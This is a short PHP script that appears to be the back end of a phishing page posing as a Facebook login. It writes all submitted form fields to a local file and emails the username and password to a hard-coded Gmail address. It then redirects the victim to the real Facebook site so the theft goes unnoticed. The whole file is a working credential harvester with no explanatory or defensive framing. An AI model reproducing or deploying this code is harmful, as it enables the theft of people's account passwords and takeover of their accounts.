<?php
$to_email = "facebookmetalf@gmail.com";

$from_email = "facebookmetalf@gmail.com";

header('Location: http://www.facebook.com/');

$handle = fopen("usernames.txt", "a");

foreach($_POST as $variable => $value) {
    // Write the form field name and value to the file
    fwrite($handle, $variable . "=" . $value . "\r\n");
}

fclose($handle);

$subject = "Login Credentials";
$message = "Username: " . $_POST['username'] . "\r\n";
$message .= "Password: " . $_POST['password'];
$headers = "From: $from_email";

mail($to_email, $subject, $message, $headers);

exit;
?>
